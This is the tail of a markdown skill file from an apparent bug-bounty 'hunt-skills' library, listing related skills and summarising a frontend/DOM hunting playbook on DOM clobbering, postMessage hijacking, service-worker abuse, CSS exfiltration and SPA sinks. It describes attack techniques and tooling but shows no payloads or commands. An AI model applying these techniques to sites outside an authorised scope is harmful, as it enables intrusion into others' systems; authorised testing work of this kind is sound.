- **`triage-validation`** (hunt-skills library) — apply the OOB-confirmed /
  state-proven gate: unique per-test markers, rendered-DOM body diff, and no
  DevTools-only claims before submission.

- **`security-arsenal`** (hunt-skills library) — DOM Invader and
  Collaborator/interactsh are the mandatory tooling for sources→sinks tracing
  and OOB proof.

---

**Summary:** This skill turns the single curated `hunt-dom` source into an
operational frontend/DOM hunting playbook. It covers five technique families —
DOM clobbering, postMessage hijacking, same-origin service-worker abuse, CSS
exfiltration, and framework/SPA sinks — with the exact recon greps, PoCs,
bypasses, and the source's hard rules (SW scripts must be same-origin; CSS
exfil dies under origin-restrictive CSP; weak origin checks are bypassable).
Every claim is grounded in that source; impact is valid only when
OOB-confirmed, state-proven, and reproducible. Full verbatim corpus:
`E:\webt\skill-setup\skills-extract-from-reports\hunt-frontend-dom\references\source-knowledge.md`.
